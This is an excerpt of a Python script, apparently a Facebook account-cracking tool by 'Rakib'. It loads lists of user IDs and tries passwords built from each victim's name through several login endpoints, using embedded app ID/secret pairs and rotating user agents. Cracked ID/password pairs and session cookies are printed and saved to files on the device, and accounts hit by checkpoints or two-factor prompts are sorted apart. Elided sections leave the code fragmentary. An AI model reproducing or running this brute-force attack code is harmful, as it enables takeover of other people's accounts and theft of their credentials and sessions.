...
\t   \033[31;42mRakib\33[0;m\__😘😈
{40*"="} \x1b[1;97m
  [\x1b[1;95m+\x1b[1;97m] AUTHOR   : Rakib
  [\x1b[1;95m+\x1b[1;97m] GITHUB   : Md-Rakib1       
  [\x1b[1;95m+\x1b[1;97m] FACEBOOK : Md Rakib 
  [\x1b[1;95m+\x1b[1;97m] VERSION  : [ 1.0]
{40*"="}\x1b[1;97m""")
...
def menu1():
	logo()
	fl = input(f'{W}[{G}•{W}] PUT YOUR FILE PATH\033[38;5;46m : {G}')
	try:
	...
	if psx in ["1", "01","11","A","a"]:
		...
		if passx in ["2", "02","22","B","a"]:
			...
			plist.append('first lastfreefire')
			plist.append('freefirelover')
...
def normalfl(id,psd,name,tid):
	...
	try:
		...
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}Rakib-M1{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		...
		if 'c_user' in logx:
			...
			print(f'\r\r{G}[Rakib-OK] {id} | {psw}{W}')
			ok.append(id)
			if 'y' in cokix:
				print(f'\r  {BG}[{W}Cookie{BG}]{E} : {G}{kuki}{W}');print(f"{W}{40*'-'}{E}")
			open('/sdcard/Rakib-FILE-OK.txt', 'a').write(id+' | '+psw+'  ------------>>>'+coki+"\n")
			break
		elif twfx in str(logx):
			print(f'\r\r{S}[Rakib-2F] {id} | {psw}{W}')
			open('/sdcard/Rakib-FILE-2F.txt', 'a').write(id+' | '+psw+"\n")
			twf.append(id)
			break
			...
			if 'y' in cpx:
				print(f'\r\r{R}[Rakib-CP] {id} | {psw}{W}')
			open('/sdcard/Rakib-FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
	lop+=1
def graphfl(id,psd,name,tid):
	...
	try:
		...
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}Rakib-M2{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
		ua=ua1()
...
def graphfl2(id,psd,name,tid):
	...
	try:
		...
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}Rakib-M3{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
		ua=ua3()
		apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
		...
		if 'Please Confirm Email' in logx:
			...
			if 'y' in cpx:
				print(f'\r\r{R}[Rakib-CP] {id} | {psw}{W}');print(ua)
			open('/sdcard/Rakib-FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
...
def nrmlrm(id,psd,tid,mytd):
	...
	for psw in psd:
		...
		if 'c_user' in lcki:
			...
			iid = coki[151:166]
			print(f'\r\r{G}[Rakib-OK] {iid} | {psw}{W}')
			if 'y' in cokix:
			...
			iid = coki[141:156]
			if 'y' in cpx:
				print(f'\r\r{R}[Rakib-CP] {iid} | {psw}{W}')
			cp.append(id)
...
def graphrm(id,psd,tid):
	...
	for psw in psd:
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{S}[Rakib-2F] {iid} | {psw}{W}')
			open('/sdcard/Rakib-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
...
def apirm(id,psd,tid):
	...
	for psw in psd:
		...
		if 'session_key' in jsn:
			print(f'\r\r{G}[Rakib-OK] {iid} | {psw}{W}')
			ok.append(id);open('/sdcard/Rakib-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'\n') #+'  ------------>>>'+coki+"\n")
			break
		elif 'www.facebook.com' in jsn['error_msg']:
			if 'y' in cpx:
				print(f'\r\r{R}[Rakib-CP] {id} | {psw}{W}')
			cp.append(id)
			open('/sdcard/Rakib-CP.txt', 'a').write(id+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
##################
